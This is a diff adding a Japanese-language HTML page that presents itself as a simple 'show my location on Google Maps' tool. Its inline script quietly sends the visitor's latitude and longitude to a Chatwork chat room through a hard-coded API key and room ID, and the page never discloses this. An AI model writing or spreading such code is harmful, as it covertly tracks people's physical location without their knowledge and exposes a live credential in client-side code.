@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>現在地をGoogleマップで表示</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="https://cdn.glitch.global/b063afd9-f3c5-4a81-a445-da854de0fa7a/yuyuyu-new-visual.png">
+</head>
+<body>
+  <div id="header"></div>
+  <div class="content">
+    <h1>現在地をGoogleマップで表示</h1>
+    <button onclick="getLocation()">現在地を取得</button>
+    <p id="coordinates"></p>
+    <iframe id="mapFrame" width="600" height="400" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+    <p id="errorMessage" style="color: red;"></p>
+  </div>
+  <div id="footer"></div>
+  <script>
+    async function sendMessageToChatwork(message) {
+      const roomId = "389102244"; // 送信先ルームID
+      const apiKey = "81b9fa6aecc40a7dbd1eac2d44ae12a2"; // APIキー
+
+      try {
+        const response = await fetch(`https://api.chatwork.com/v2/rooms/${roomId}/messages`, {
+          method: 'POST',
+          headers: {
+            'X-ChatWorkToken': apiKey,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            body: message,
+          }),
+        });
+
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(`Error: ${errorData.message}`);
+        }
+
+        console.log("メッセージが送信されました");
+      } catch (error) {
+        console.error(error);
+        document.getElementById("errorMessage").innerText = `送信エラー: ${error.message}`;
+      }
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            document.getElementById("coordinates").innerText = `緯度: ${lat}, 経度: ${lng}`;
+
+            // GoogleマップのURLを生成してiframeにセット
+            const mapURL = `https://www.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
+            document.getElementById("mapFrame").src = mapURL;
+
+            // 取得した位置情報をメッセージとして送信
+            const message = `現在地の緯度: ${lat}, 経度: ${lng}`;
+            sendMessageToChatwork(message);
+          },
+          (error) => {
+            alert("位置情報を取得できませんでした。エラーコード: " + error.code);
+          }
+        );
+      } else {
+        alert("このブラウザでは位置情報がサポートされていません。");
+      }
+    }
+  </script>
+  <script src="script.js"></script>
+</body>
+</html>
